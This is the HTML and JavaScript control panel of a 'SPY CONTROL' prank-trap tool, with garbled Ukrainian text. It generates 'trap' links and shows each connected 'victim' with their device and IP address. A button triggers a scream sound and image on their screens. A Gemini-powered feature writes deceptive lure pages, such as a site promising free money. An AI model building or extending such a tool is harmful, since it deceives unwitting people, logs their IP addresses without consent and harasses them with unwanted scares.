<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPY CONTROL v2.1 AI</title>
    <style>
        :root {
            --neon: #00ff99;
            --danger: #ff0055;
            --bg: #0a0a0c;
            --card: #16161a;
            --ai-glow: #6200ea;
        }
        body { 
            background-color: var(--bg); color: white; 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            display: flex; justify-content: center; padding: 20px; margin: 0;
            background-image: radial-gradient(circle at 50% 50%, #1a1a2e 0%, #0a0a0c 100%);
        }
        .container { 
            width: 100%; max-width: 450px; background: var(--card); 
            padding: 25px; border-radius: 20px; border: 1px solid #333;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .lang-bar { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .lang-btn { 
            background: #222; border: 1px solid #444; color: #aaa; 
            padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px; transition: 0.3s;
        }
        .lang-btn.active { border-color: var(--neon); color: var(--neon); background: rgba(0,255,153,0.1); }
        
        h1 { font-size: 22px; letter-spacing: 2px; text-transform: uppercase; color: var(--neon); margin-top: 0; text-align: center; }
        
        input, textarea { 
            width: 100%; padding: 12px; background: #0f0f12; border: 1px solid #333; 
            color: white; border-radius: 10px; box-sizing: border-box; outline: none; margin-bottom: 10px;
        }
        input:focus, textarea:focus { border-color: var(--neon); }
        
        button { 
            width: 100%; padding: 15px; border: none; border-radius: 10px; 
            cursor: pointer; font-size: 15px; font-weight: bold; transition: 0.3s;
        }
        .btn-create { background: var(--neon); color: black; }
        .btn-update { background: #333; color: white; font-size: 13px; }
        .btn-scare { 
            background: var(--danger); color: white; height: 80px; font-size: 22px; 
            display: none; margin-top: 20px; animation: pulse 1.5s infinite;
        }
        
        /* AI Styles */
        .ai-box {
            margin-top: 20px; padding: 15px; border: 1px dashed var(--ai-glow);
            border-radius: 12px; background: rgba(98, 0, 234, 0.05);
        }
        .btn-ai-toggle {
            background: linear-gradient(90deg, var(--ai-glow), #b388ff);
            color: white; margin-bottom: 10px;
        }
        #ai-status { font-size: 11px; color: var(--ai-glow); margin-top: 8px; text-align: center; }

        .history-item { 
            background: #1c1c21; padding: 12px; margin-bottom: 10px; border-radius: 10px; 
            display: flex; justify-content: space-between; align-items: center; border: 1px solid #333;
        }
        .history-info { cursor: pointer; flex-grow: 1; }
        .btn-delete { background: transparent; color: #ff4444; width: auto; padding: 5px 10px; font-size: 18px; opacity: 0.6; }

        .link-box { 
            background: #000; padding: 10px; border-radius: 8px; font-family: monospace; 
            font-size: 11px; margin: 15px 0; border: 1px dashed #444; word-break: break-all;
        }

        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,0,85,0.7); } 70% { box-shadow: 0 0 0 15px rgba(255,0,85,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,85,0); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="lang-bar">
            <button class="lang-btn active" onclick="setLang('uk')">UA</button>
            <button class="lang-btn" onclick="setLang('ru')">RU</button>
            <button class="lang-btn" onclick="setLang('en')">EN</button>
        </div>

        <h1 id="t-title">üëÅÔ∏è SPY CONTROL</h1>
        
        <div id="setup-step">
            <input type="text" id="imgUrl" placeholder="URL –ö–∞—Ä—Ç–∏–Ω–∫–∏">
            <input type="text" id="sndUrl" placeholder="URL –ó–≤—É–∫—É (.mp3)" value="https://www.myinstants.com/media/sounds/scream.mp3">
            <button class="btn-create" onclick="createLink()" id="t-btn-create">–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£</button>
        </div>

        <div id="control-panel" style="display: none;">
            <div class="link-box">
                <a id="victim-link" href="#" target="_blank" style="color: #4db8ff; text-decoration: none;">...</a>
            </div>
            
            <div class="ai-box">
                <button class="btn-ai-toggle" onclick="toggleAI()">ü§ñ AI –ì–ï–ù–ï–†–ê–¢–û–† (Gemini 2.0)</button>
                <div id="ai-input-area" style="display:none;">
                    <textarea id="ai-prompt" placeholder="–û–ø–∏—à—ñ—Ç—å —Ç–µ–º—É (–Ω–∞–ø—Ä. –°–∞–π—Ç –ø—Ä–æ –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω—ñ –≥—Ä–æ—à—ñ)"></textarea>
                    <button onclick="runAIGeneration()" style="background:var(--neon); color:black; padding:8px;">–ó–ì–ï–ù–ï–†–£–í–ê–¢–ò HTML</button>
                </div>
                <div id="ai-status"></div>
            </div>

            <div style="background: #1c1c21; padding: 15px; border-radius: 12px; margin-top:15px;">
                <label style="color: var(--neon); font-size:12px;">–û–ù–û–í–ò–¢–ò –ú–ï–î–Ü–ê</label>
                <input type="text" id="newImgUrl" placeholder="–ù–æ–≤–∏–π URL –∫–∞—Ä—Ç–∏–Ω–∫–∏">
                <input type="text" id="newSndUrl" placeholder="–ù–æ–≤–∏–π URL –∑–≤—É–∫—É">
                <button onclick="updateMedia()" class="btn-update">–û–ù–û–í–ò–¢–ò –î–õ–Ø –í–°–Ü–•</button>
            </div>

            <div id="users-list" style="margin-top:10px;"></div>
            <button id="scare-btn" class="btn-scare" onclick="trigger()">–ù–ê–õ–Ø–ö–ê–¢–ò üíÄ</button>
            <button onclick="location.reload()" style="background: transparent; color: #555; margin-top: 15px; font-size: 13px;">‚¨Ö –ù–∞–∑–∞–¥ –¥–æ —ñ—Å—Ç–æ—Ä—ñ—ó</button>
        </div>

        <div id="history-panel">
            <h3 id="t-history" style="color: #555; font-size: 14px; margin-top: 30px;">–Ü–°–¢–û–†–Ü–Ø –°–ï–°–Ü–ô</h3>
            <div id="history-list"></div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let currentSessionId = null;

        const i18n = {
            uk: { title: "üëÅÔ∏è SPY CONTROL", create: "–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£", history: "–Ü–°–¢–û–†–Ü–Ø –°–ï–°–Ü–ô", delConfirm: "–í–∏–¥–∞–ª–∏—Ç–∏?" },
            ru: { title: "üëÅÔ∏è SPY CONTROL", create: "–°–û–ó–î–ê–¢–¨ –õ–û–í–£–®–ö–£", history: "–ò–°–¢–û–†–ò–Ø –°–ï–°–°–ò–ô", delConfirm: "–£–¥–∞–ª–∏—Ç—å?" },
            en: { title: "üëÅÔ∏è SPY CONTROL", create: "CREATE TRAP", history: "SESSION HISTORY", delConfirm: "Delete?" }
        };

        function setLang(lang) {
            document.getElementById('t-title').innerText = i18n[lang].title;
            document.getElementById('t-btn-create').innerText = i18n[lang].create;
            document.getElementById('t-history').innerText = i18n[lang].history;
            window.currentLang = lang;
        }

        window.onload = loadHistory;

        async function createLink() {
            const image = document.getElementById('imgUrl').value.trim();
            const sound = document.getElementById('sndUrl').value.trim();
            const res = await fetch('/create', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ image, sound })
            });
            const data = await res.json();
            saveToHistory(data.id);
            activateRoom(data.id);
        }

        function activateRoom(id) {
            currentSessionId = id;
            document.getElementById('setup-step').style.display = 'none';
            document.getElementById('history-panel').style.display = 'none';
            document.getElementById('control-panel').style.display = 'block';
            const link = `${window.location.origin}/victim.html?id=${id}`;
            document.getElementById('victim-link').href = link;
            document.getElementById('victim-link').innerText = link;
            socket.emit('join-room-admin', id);
        }

        function toggleAI() {
            const area = document.getElementById('ai-input-area');
            area.style.display = area.style.display === 'none' ? 'block' : 'none';
        }

        async function runAIGeneration() {
            const prompt = document.getElementById('ai-prompt').value;
            const status = document.getElementById('ai-status');
            if(!prompt) return alert("–û–ø–∏—à—ñ—Ç—å —Ç–µ–º—É!");

            status.innerText = "‚è≥ Gemini 2.0 –≥–µ–Ω–µ—Ä—É—î —Å–∞–π—Ç...";
            
            try {
                const res = await fetch('/generate-ai-page', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ sessionId: currentSessionId, prompt })
                });
                const data = await res.json();
                if(data.success) {
                    const fullUrl = window.location.origin + data.url;
                    status.innerHTML = `‚úÖ –ì–æ—Ç–æ–≤–æ! <br> <a href="${data.url}" target="_blank" style="color:var(--neon)">–í–Ü–î–ö–†–ò–¢–ò –°–ê–ô–¢</a>`;
                    document.getElementById('victim-link').innerText = fullUrl;
                    document.getElementById('victim-link').href = data.url;
                } else {
                    status.innerText = "‚ùå –ü–æ–º–∏–ª–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞";
                }
            } catch (e) {
                status.innerText = "‚ùå –ü–æ–º–∏–ª–∫–∞ –∑–∞–ø–∏—Ç—É";
            }
        }

        async function updateMedia() {
            const image = document.getElementById('newImgUrl').value.trim();
            const sound = document.getElementById('newSndUrl').value.trim();
            await fetch(`/update-session/${currentSessionId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image, sound })
            });
            alert('–î–∞–Ω—ñ –æ–Ω–æ–≤–ª–µ–Ω–æ!');
        }

        function trigger() {
            if(currentSessionId) socket.emit('trigger-scare', currentSessionId);
        }

        socket.on('update-victim-list', (users) => {
            const listDiv = document.getElementById('users-list');
            const scareBtn = document.getElementById('scare-btn');
            if (users.length > 0) {
                scareBtn.style.display = 'block';
                listDiv.innerHTML = users.map(u => `<div style="font-size:11px; color:var(--neon); border-bottom:1px solid #222; padding:5px;">üì± ${u.device} (${u.ip})</div>`).join('');
            } else {
                scareBtn.style.display = 'none';
                listDiv.innerHTML = '<div style="color:#444; font-size:11px;">–ß–µ–∫–∞—î–º–æ –Ω–∞ –∂–µ—Ä—Ç–≤—É...</div>';
            }
        });

        function saveToHistory(id) {
            const list = JSON.parse(localStorage.getItem('prank_rooms') || '[]');
            if (!list.find(i => i.id === id)) {
                list.unshift({ id, date: new Date().toLocaleString() });
                localStorage.setItem('prank_rooms', JSON.stringify(list.slice(0, 10)));
            }
        }

        async function loadHistory() {
            const list = JSON.parse(localStorage.getItem('prank_rooms') || '[]');
            const container = document.getElementById('history-list');
            container.innerHTML = '';
            if (list.length === 0) return;

            const res = await fetch('/check-status', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ ids: list.map(i => i.id) })
            });
            const statuses = await res.json();

            list.forEach(item => {
                const s = statuses.find(x => x.id === item.id) || { count: 0 };
                const div = document.createElement('div');
                div.className = 'history-item';
                div.innerHTML = `
                    <div class="history-info" onclick="activateRoom('${item.id}')">
                        <span style="font-size:12px;">ID: ...${item.id.slice(-5)}</span>
                        <span style="color:${s.count > 0 ? 'var(--neon)' : '#555'}; font-size:10px; margin-left:10px;">‚óè ${s.count} Online</span>
                    </div>
                `;
                container.appendChild(div);
            });
        }
    </script>
</body>
</html>
